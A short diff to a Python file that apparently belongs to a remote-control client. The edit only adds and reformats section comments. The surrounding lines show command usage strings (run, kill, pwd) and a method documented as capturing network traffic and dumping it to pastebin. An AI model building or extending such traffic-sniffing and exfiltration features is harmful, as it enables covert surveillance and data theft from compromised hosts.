@@ -1112,6 +1112,8 @@ class Client(object):
         """capture client network traffic and dump to pastebin"""
         return self._packetsniff()
 
+# -----------------  usage  --------------------------
+
     pwd.usage           = 'pwd'
     run.usage           = 'run'
     kill.usage          = 'kill'
@@ -1141,7 +1143,7 @@ class Client(object):
     disable.usage       = 'disable <cmd>'
     enable.usage        = 'enable <cmd>'
 
-# -----------------   main   --------------------------
+# -----------------  main  --------------------------
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
